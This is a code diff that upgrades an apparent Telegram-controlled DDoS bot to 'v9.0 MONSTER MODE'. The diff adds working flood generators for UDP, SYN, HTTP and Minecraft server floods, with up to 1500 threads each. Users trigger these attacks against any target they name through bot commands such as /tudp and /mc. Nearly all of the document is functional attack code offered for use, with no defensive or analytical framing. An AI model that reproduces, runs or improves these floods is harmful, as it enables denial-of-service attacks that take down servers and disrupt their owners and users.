@@ -1,8 +1,7 @@
-#!/usr/bin/env python3
 """
-💀 DDOS BOT v8.0 - ULTIMATE POWER 💀
+💀 DDOS BOT v9.0 - MONSTER MODE 💀
 GitHub Codespaces Ready
-Features: Ping, TCP Ping, IP Resolver, 10+ Attack Methods, Attack Status Display
+Features: TUDP, Minecraft Attacks, UDP, TCP, SYN, HTTP, UDP Bypass, TCP Bypass, Cloudflare, GUDP, Mixed, Ping, TCP Ping
 """
 
 import telebot
@@ -17,10 +16,11 @@ import sys
 import re
 import urllib.request
 import json
+import struct
 
 # ========== CONFIGURATION ==========
 BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
-ADMIN_IDS = os.getenv("ADMIN_IDS", "6186265634").split(",")
+ADMIN_IDS = os.getenv("ADMIN_IDS", "8908646607").split(",")
 USER_FILE = "users.txt"
 LOG_FILE = "logs.txt"
 
@@ -34,7 +34,6 @@ lock = threading.Lock()
 # ========== IP RESOLVER ==========
 
 def resolve_ip(host):
-    """Resolve domain to IP address"""
     try:
         host = re.sub(r'^https?://', '', host)
         host = host.split('/')[0]
@@ -46,7 +45,6 @@ def resolve_ip(host):
         return None
 
 def get_domain_info(host):
-    """Get domain information"""
     try:
         host = re.sub(r'^https?://', '', host)
         host = host.split('/')[0]
@@ -115,7 +113,138 @@ def tcp_ping(host, port=80, timeout=3):
     except:
         return {"status": "ERROR", "port": port}
 
-# ========== ATTACK FUNCTIONS ==========
+# ========== MONSTER ATTACK FUNCTIONS ==========
+
+def create_tudp_attack(target, port, duration, threads=1500):
+    """TUDP - Monster UDP Flood (SIRISAKz Style)"""
+    return f"""python3 -c "
+import random, socket, threading, time, sys
+target='{target}'; port={port}; duration={duration}; threads={threads}
+thr = 0
+def flood():
+    global thr
+    data = random._urandom(1200)
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        addr = (target, port)
+        end = time.time() + duration
+        count = 0
+        while time.time() < end:
+            try:
+                s.sendto(data, addr)
+                s.sendto(data, addr)
+                s.sendto(data, addr)
+                s.sendto(data, addr)
+                s.sendto(data, addr)
+                count += 5
+                if count % 1000 == 0:
+                    sys.stderr.write(f'TUDP: {{count}} packets sent\\n')
+            except:
+                pass
+        s.close()
+        sys.stderr.write(f'TUDP completed: {{count}} packets\\n')
+    except: pass
+for i in range(threads):
+    threading.Thread(target=flood, daemon=True).start()
+time.sleep(duration + 2)
+\" """
+
+def create_minecraft_attack(target, port, duration, threads=1000):
+    """Minecraft Attack - UDP Flood with Minecraft packet spoofing"""
+    return f"""python3 -c "
+import random, socket, threading, time, sys, struct
+target='{target}'; port={port}; duration={duration}; threads={threads}
+def flood():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        end = time.time() + duration
+        count = 0
+        while time.time() < end:
+            try:
+                # Minecraft server ping packet
+                packet = b'\\x00\\x00\\x00\\x00' + random._urandom(64)
+                s.sendto(packet, (target, port))
+                # Another variant
+                packet2 = b'\\xFE\\x01' + random._urandom(32)
+                s.sendto(packet2, (target, port))
+                # Large packet
+                packet3 = random._urandom(2048)
+                s.sendto(packet3, (target, port))
+                count += 3
+                if count % 1000 == 0:
+                    sys.stderr.write(f'MC: {{count}} packets sent\\n')
+            except:
+                pass
+        s.close()
+        sys.stderr.write(f'MC attack completed: {{count}} packets\\n')
+    except: pass
+for i in range(threads):
+    threading.Thread(target=flood, daemon=True).start()
+time.sleep(duration + 2)
+\" """
+
+def create_minecraft_query_attack(target, port, duration, threads=800):
+    """Minecraft Query Attack - Full query flood"""
+    return f"""python3 -c "
+import random, socket, threading, time, sys, struct
+target='{target}'; port={port}; duration={duration}; threads={threads}
+def flood():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        end = time.time() + duration
+        count = 0
+        while time.time() < end:
+            try:
+                # Minecraft Query packet
+                packet = b'\\xFE\\xFD\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' + random._urandom(32)
+                s.sendto(packet, (target, port))
+                # Another query variant
+                packet2 = b'\\xFE\\xFD\\x09' + random._urandom(16)
+                s.sendto(packet2, (target, port))
+                count += 2
+                if count % 1000 == 0:
+                    sys.stderr.write(f'MC Query: {{count}} packets\\n')
+            except:
+                pass
+        s.close()
+        sys.stderr.write(f'MC Query completed: {{count}} packets\\n')
+    except: pass
+for i in range(threads):
+    threading.Thread(target=flood, daemon=True).start()
+time.sleep(duration + 2)
+\" """
+
+def create_minecraft_handshake_attack(target, port, duration, threads=600):
+    """Minecraft Handshake Attack - Spoof handshake packets"""
+    return f"""python3 -c "
+import random, socket, threading, time, sys, struct
+target='{target}'; port={port}; duration={duration}; threads={threads}
+def flood():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(0.1)
+        end = time.time() + duration
+        count = 0
+        while time.time() < end:
+            try:
+                # Minecraft handshake packet
+                packet = b'\\x10\\x00\\x00\\x00' + b'\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00' + b'localhost' + b'\\x00\\x00\\x00\\x00'
+                s.connect_ex((target, port))
+                s.sendto(packet, (target, port))
+                count += 1
+                if count % 1000 == 0:
+                    sys.stderr.write(f'MC Handshake: {{count}} packets\\n')
+            except:
+                pass
+        s.close()
+        sys.stderr.write(f'MC Handshake completed: {{count}} packets\\n')
+    except: pass
+for i in range(threads):
+    threading.Thread(target=flood, daemon=True).start()
+time.sleep(duration + 2)
+\" """
 
 def create_udp_attack(target, port, duration, threads=1500):
     return f"""python3 -c "
@@ -133,11 +262,11 @@ def flood():
                 s.sendto(payload, (target, port))
                 count += 1
                 if count % 10000 == 0:
-                    sys.stderr.write(f'UDP: {{count}} packets sent\\n')
+                    sys.stderr.write(f'UDP: {{count}} packets\\n')
             except:
                 pass
         s.close()
-        sys.stderr.write(f'UDP attack completed: {{count}} packets\\n')
+        sys.stderr.write(f'UDP completed: {{count}} packets\\n')
     except: pass
 for i in range(threads):
     threading.Thread(target=flood, daemon=True).start()
@@ -162,8 +291,56 @@ def flood():
                 if count % 10000 == 0:
                     sys.stderr.write(f'TCP: {{count}} connections\\n')
             except: pass
-        sys.stderr.write(f'TCP attack completed: {{count}} connections\\n')
+        sys.stderr.write(f'TCP completed: {{count}} connections\\n')
     except: pass
+for i in range(threads):
+    threading.Thread(target=flood, daemon=True).start()
+time.sleep(duration + 2)
+\" """
+
+def create_syn_attack(target, port, duration, threads=800):
+    return f"""python3 -c "
+import socket, random, time, threading, sys
+target='{target}'; port={port}; duration={duration}; threads={threads}
+def flood():
+    try:
+        end = time.time() + duration
+        count = 0
+        while time.time() < end:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(0.02)
+                s.connect_ex((target, port))
+                s.close()
+                count += 1
+                if count % 10000 == 0:
+                    sys.stderr.write(f'SYN: {{count}} packets\\n')
+            except: pass
+        sys.stderr.write(f'SYN completed: {{count}} packets\\n')
+    except: pass
+for i in range(threads):
+    threading.Thread(target=flood, daemon=True).start()
+time.sleep(duration + 2)
+\" """
+
+def create_http_attack(target, port, duration, threads=500):
+    return f"""python3 -c "
+import urllib.request, random, time, threading, sys
+target='{target}'; port={port}; duration={duration}; threads={threads}
+ua = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Googlebot/2.1']
+def flood():
+    end = time.time() + duration
+    count = 0
+    while time.time() < end:
+        try:
+            req = urllib.request.Request(f'http://{{target}}:{{port}}/')
+            req.add_header('User-Agent', random.choice(ua))
+            urllib.request.urlopen(req, timeout=1)
+            count += 1
+            if count % 1000 == 0:
+                sys.stderr.write(f'HTTP: {{count}} requests\\n')
+        except: pass
+    sys.stderr.write(f'HTTP completed: {{count}} requests\\n')
 for i in range(threads):
     threading.Thread(target=flood, daemon=True).start()
 time.sleep(duration + 2)
@@ -185,7 +362,7 @@ def flood():
                 p = random._urandom(65507)
                 s.sendto(p, (target, random.choice(ports)))
                 s.sendto(p, (target, port))
-                count += 1
+                count += 2
                 if count % 10000 == 0:
                     sys.stderr.write(f'UDP BYPASS: {{count}} packets\\n')
             except: pass
@@ -269,61 +446,13 @@ def flood():
                 p = random._urandom(65507)
                 s.sendto(p, (target, port))
                 s.sendto(p, (target, random.randint(1, 65535)))
-                count += 1
+                count += 2
                 if count % 10000 == 0:
                     sys.stderr.write(f'GUDP: {{count}} packets\\n')
             except: pass
         s.close()
         sys.stderr.write(f'GUDP completed: {{count}} packets\\n')
     except: pass
-for i in range(threads):
-    threading.Thread(target=flood, daemon=True).start()
-time.sleep(duration + 2)
-\" """
-
-def create_syn_attack(target, port, duration, threads=800):
-    return f"""python3 -c "
-import socket, random, time, threading, sys
-target='{target}'; port={port}; duration={duration}; threads={threads}
-def flood():
-    try:
-        end = time.time() + duration
-        count = 0
-        while time.time() < end:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(0.02)
-                s.connect_ex((target, port))
-                s.close()
-                count += 1
-                if count % 10000 == 0:
-                    sys.stderr.write(f'SYN: {{count}} packets\\n')
-            except: pass
-        sys.stderr.write(f'SYN completed: {{count}} packets\\n')
-    except: pass
-for i in range(threads):
-    threading.Thread(target=flood, daemon=True).start()
-time.sleep(duration + 2)
-\" """
-
-def create_http_attack(target, port, duration, threads=500):
-    return f"""python3 -c "
-import urllib.request, random, time, threading, sys
-target='{target}'; port={port}; duration={duration}; threads={threads}
-ua = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Googlebot/2.1']
-def flood():
-    end = time.time() + duration
-    count = 0
-    while time.time() < end:
-        try:
-            req = urllib.request.Request(f'http://{{target}}:{{port}}/')
-            req.add_header('User-Agent', random.choice(ua))
-            urllib.request.urlopen(req, timeout=1)
-            count += 1
-            if count % 1000 == 0:
-                sys.stderr.write(f'HTTP: {{count}} requests\\n')
-        except: pass
-    sys.stderr.write(f'HTTP completed: {{count}} requests\\n')
 for i in range(threads):
     threading.Thread(target=flood, daemon=True).start()
 time.sleep(duration + 2)
@@ -371,14 +500,18 @@ def execute_attack(user_id, attack_type, target, port, duration):
         return False, "Duration must be 1-600 seconds"
 
     attack_map = {
+        'tudp': (create_tudp_attack, 1500),
+        'mc': (create_minecraft_attack, 1000),
+        'mcquery': (create_minecraft_query_attack, 800),
+        'mchandshake': (create_minecraft_handshake_attack, 600),
         'udp': (create_udp_attack, 1500),
         'tcp': (create_tcp_attack, 1000),
+        'syn': (create_syn_attack, 800),
         'http': (create_http_attack, 500),
         'udpbypass': (create_udpbypass_attack, 1200),
         'tcpbypass': (create_tcpbypass_attack, 800),
         'cf': (create_cloudflare_attack, 600),
         'gudp': (create_gudp_attack, 1500),
-        'syn': (create_syn_attack, 800),
         'mixed': (create_mixed_attack, 1000),
     }
 
@@ -439,9 +572,13 @@ def save_user(user_id):
 
 @bot.message_handler(commands=['start'])
 def start_command(message):
-    bot.reply_to(message, """💀 DDOS BOT v8.0 - ULTIMATE POWER 💀
+    bot.reply_to(message, """💀 DDOS BOT v9.0 - MONSTER MODE 💀
 
-🔥 ATTACKS:
+🔥 MONSTER ATTACKS:
+/tudp <target> <port> <time> - TUDP Monster Flood
+/mc <target> <port> <time> - Minecraft Attack
+/mcquery <target> <port> <time> - Minecraft Query
+/mchandshake <target> <port> <time> - Minecraft Handshake
 /udp <target> <port> <time> - UDP Flood
 /tcp <target> <port> <time> - TCP Flood
 /syn <target> <port> <time> - SYN Flood
@@ -456,6 +593,7 @@ def start_command(message):
 /ping <ip/domain> - Ping target
 /tcpping <ip> <port> - TCP Ping
 /resolve <domain> - Resolve IP & Info
+/check - Check attack status
 
 🛑 CONTROL:
 /stopall - Stop your attacks
@@ -463,13 +601,17 @@ def start_command(message):
 /id - Get your ID
 
 👑 Admin: /admin
-Example: /udp 8.8.8.8 53 60""")
+Example: /tudp 8.8.8.8 53 60""")
 
 @bot.message_handler(commands=['help'])
 def help_command(message):
-    bot.reply_to(message, """💀 COMMANDS 💀
+    bot.reply_to(message, """💀 MONSTER COMMANDS 💀
 
-🔥 ATTACKS (with status display):
+🔥 ATTACKS:
+/tudp 1.2.3.4 80 60 - TUDP Monster
+/mc 1.2.3.4 25565 60 - Minecraft Attack
+/mcquery 1.2.3.4 25565 60 - Minecraft Query
+/mchandshake 1.2.3.4 25565 60 - Minecraft Handshake
 /udp 1.2.3.4 80 60 - UDP Flood
 /tcp 1.2.3.4 80 60 - TCP Flood
 /syn 1.2.3.4 80 60 - SYN Flood
@@ -484,6 +626,7 @@ def help_command(message):
 /ping google.com
 /tcpping 1.2.3.4 80
 /resolve google.com
+/check - Check attack status
 
 🛑 CONTROL:
 /stopall
@@ -591,10 +734,39 @@ def status_command(message):
         attacks = running_attacks[user_id]
         msg = f"🔥 ACTIVE ATTACKS ({len(attacks)})\n\n"
         for i, (proc, temp_file, attack_type, target, port, duration, threads) in enumerate(attacks, 1):
+            status = '🟢 Running' if proc.poll() is None else '🔴 Completed'
             msg += f"{i}. {attack_type.upper()} → {target}:{port}\n"
             msg += f"   ⏱️ Duration: {duration}s | 🧵 Threads: {threads}\n"
-            msg += f"   📊 Status: {'🟢 Running' if proc.poll() is None else '🔴 Completed'}\n\n"
+            msg += f"   📊 Status: {status}\n\n"
         bot.reply_to(message, msg)
+
+@bot.message_handler(commands=['check'])
+def check_command(message):
+    """Check if attack is actually running"""
+    user_id = str(message.chat.id)
+    if user_id not in allowed_users and user_id not in ADMIN_IDS:
+        bot.reply_to(message, "❌ Not authorized")
+        return
+    
+    # Check running attacks
+    result = subprocess.getoutput("ps aux | grep -E 'attack_.*\.py' | grep -v grep")
+    
+    if result:
+        response = f"🟢 ATTACK RUNNING!\n\n```\n{result[:500]}\n```"
+    else:
+        response = "🔴 No attack running"
+    
+    # Check network traffic
+    traffic = subprocess.getoutput("netstat -an | grep -E 'ESTABLISHED|SYN_SENT' | head -5")
+    if traffic and "ESTABLISHED" in traffic:
+        response += f"\n\n📊 Network Connections:\n```\n{traffic}\n```"
+    
+    # Check temp files
+    files = subprocess.getoutput("ls -la /tmp/attack_*.py 2>/dev/null")
+    if files and "No such file" not in files:
+        response += f"\n\n📁 Attack files found:\n```\n{files[:200]}\n```"
+    
+    bot.reply_to(message, response, parse_mode="Markdown")
 
 @bot.message_handler(commands=['stopall'])
 def stopall_command(message):
@@ -702,7 +874,7 @@ def make_handler(attack_type):
             return
 
         # Show attack starting
-        status_msg = bot.reply_to(message, f"""⚡ Starting {attack_type.upper()} Attack... 
+        status_msg = bot.reply_to(message, f"""⚡ Starting {attack_type.upper()} Attack...
 
 🎯 Target: {target}:{port}
 ⏱️ Duration: {duration}s
@@ -728,7 +900,7 @@ Threads: {msg.split('with ')[-1].split(' ')[0] if 'with ' in msg else 'N/A'}
     return handler
 
 # Register all attacks
-attacks = ['udp', 'tcp', 'syn', 'http', 'udpbypass', 'tcpbypass', 'cf', 'gudp', 'mixed']
+attacks = ['tudp', 'mc', 'mcquery', 'mchandshake', 'udp', 'tcp', 'syn', 'http', 'udpbypass', 'tcpbypass', 'cf', 'gudp', 'mixed']
 for attack in attacks:
     handler = make_handler(attack)
     handler.__name__ = f"handle_{attack}"
@@ -739,7 +911,7 @@ for attack in attacks:
 
 if __name__ == "__main__":
     print("=" * 50)
-    print("💀 DDOS BOT v8.0 - ULTIMATE POWER 💀")
+    print("💀 DDOS BOT v9.0 - MONSTER MODE 💀")
     print("=" * 50)
     allowed_users = load_users()
     for admin in ADMIN_IDS:
@@ -749,7 +921,7 @@ if __name__ == "__main__":
     print(f"[+] Loaded {len(allowed_users)} users")
     print(f"[+] Admin IDs: {ADMIN_IDS}")
     print(f"[+] Attack methods: {len(attacks)}")
-    print(f"[+] Tools: Ping, TCP Ping, Resolver")
+    print(f"[+] Tools: Ping, TCP Ping, Resolver, Check")
     print("=" * 50)
     print("[+] Bot running! Press Ctrl+C to stop.")
     bot.polling(none_stop=True)
